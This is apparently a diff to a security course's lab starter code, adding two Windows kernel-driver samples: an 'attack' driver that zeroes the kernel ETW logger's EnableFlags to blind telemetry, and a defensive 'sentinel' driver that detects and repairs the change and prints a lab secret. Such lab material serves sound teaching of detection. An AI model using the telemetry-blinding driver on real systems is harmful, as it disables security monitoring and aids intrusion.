@@ -763,3 +763,80 @@ NTSTATUS DriverEntry(
     return STATUS_SUCCESS;
 }
 `;
+
+// ---------------------------------------------------------------------------
+// m26.l2.lab1 — kernel ETW logger blindfolding
+export const ATTACK_ETWTAMPER_STARTER = `// ATTACK 6 - CKCL EnableFlags zeroing (m26.l2)
+//
+// The kernel's shared telemetry gate is a pool struct, not protected
+// state: PatchGuard never walks _WMI_LOGGER_CONTEXT. Zero the CKCL
+// session's EnableFlags dword and every event class dies at build time -
+// providers keep succeeding, nothing reaches the buffers.
+//
+// After loading, prove it from the debugger:
+//   kd> !etwpump 8                ; delivered: 0  suppressed: 8
+//   kd> !etwloggers               ; verdict: BLINDED + repair line
+
+#include <ntddk.h>
+
+#define CKCL_CONTEXT   0xfffff8055a740000ULL  // _WMI_LOGGER_CONTEXT (teaching)
+#define ENABLEFLAGS_OFF 0x10
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    volatile ULONG* flags =
+        (volatile ULONG*)(CKCL_CONTEXT + ENABLEFLAGS_OFF);
+    DbgPrint("ATTACK-ETW: CKCL EnableFlags was 0x%08x\\n", *flags);
+    *flags = 0;
+    DbgPrint("ATTACK-ETW: CKCL EnableFlags now 0x%08x - gate closed\\n",
+             *flags);
+    return STATUS_SUCCESS;
+}
+`;
+
+// ---------------------------------------------------------------------------
+// m26.l3.lab1 — KF-Sentinel v7: logger-context attestation
+export const SENTINEL_V7_STARTER = `// KF-Sentinel v7 - ETW logger attestation (m26.l3)
+//
+// PatchGuard ignores _WMI_LOGGER_CONTEXT; EDR agents poll-and-assert their
+// own sessions instead. Baseline here: CKCL EnableFlags == 0xff. Any drift
+// (zero especially) means someone is starving the trace buffers.
+
+#include <ntddk.h>
+
+#define CKCL_CONTEXT    0xfffff8055a740000ULL
+#define ENABLEFLAGS_OFF 0x10
+#define BASELINE_FLAGS  0x000000ff
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    volatile ULONG* flags =
+        (volatile ULONG*)(CKCL_CONTEXT + ENABLEFLAGS_OFF);
+    ULONG cur = *flags;
+
+    DbgPrint("SENTINEL-V7: attesting logger CKCL @ %p\\n",
+             (PVOID)CKCL_CONTEXT);
+    if (cur != BASELINE_FLAGS) {
+        DbgPrint("SENTINEL-V7: EnableFlags DRIFT 0x%08x -> 0x%08x (%s)\\n",
+                 BASELINE_FLAGS, cur,
+                 cur == 0 ? "BLINDED" : "TAMPERED");
+        // re-assert the baseline: agents repair, they do not just alert
+        *flags = BASELINE_FLAGS;
+        DbgPrint("SENTINEL-V7: baseline re-asserted -> 0x%08x\\n", *flags);
+        DbgPrint("SENTINEL-V7: secret=kf-sentinel-v7-ok\\n");
+    } else {
+        DbgPrint("SENTINEL-V7: logger context matches baseline\\n");
+    }
+    return STATUS_SUCCESS;
+}
+`;
